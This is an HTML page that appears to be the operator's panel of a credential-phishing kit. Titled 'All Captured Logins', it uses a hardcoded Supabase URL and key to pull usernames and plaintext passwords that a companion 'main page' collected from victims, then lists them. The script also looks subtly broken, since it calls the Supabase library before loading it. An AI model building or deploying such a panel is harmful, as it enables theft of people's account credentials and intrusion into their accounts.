<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel</title>
  <style>
    body { font-family: Arial, sans-serif; background:#f2f3f5; padding:20px; }
    .card { background:white; padding:15px; margin:10px 0; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.1); }
    button { padding:12px 24px; background:#0064e0; color:white; border:none; border-radius:8px; cursor:pointer; }
  </style>
</head>
<body>
  <h1>All Captured Logins</h1>
  <button onclick="loadLogins()">🔄 Refresh</button>
  <div id="list"></div>

  <script>
    const SUPABASE_URL = "https://kzhodlfnaoxfbmcmffuq.supabase.co";
    const SUPABASE_ANON_KEY = "sb_publishable_82Z4St3QMsjIewnpr9i50w_Lxq0iTZo"; // ← Full key

    let supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    async function loadLogins() {
      const list = document.getElementById('list');
      list.innerHTML = "<p>Loading data...</p>";

      try {
        const { data, error } = await supabase
          .from('logins')
          .select('*')
          .order('timestamp', { ascending: false });

        if (error) throw error;

        if (!data || data.length === 0) {
          list.innerHTML = "<p>No data yet. Try logging in on the main page.</p>";
          return;
        }

        let html = '';
        data.forEach(item => {
          html += `
            <div class="card">
              <strong>Username:</strong> ${item.username}<br>
              <strong>Password:</strong> ${item.password}<br>
              <small>${new Date(item.timestamp).toLocaleString()}</small>
            </div>`;
        });
        list.innerHTML = html;
      } catch (err) {
        list.innerHTML = `<p style="color:red">Error: ${err.message}</p>`;
        console.error(err);
      }
    }

    loadLogins();
  </script>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  
</body>
</html>
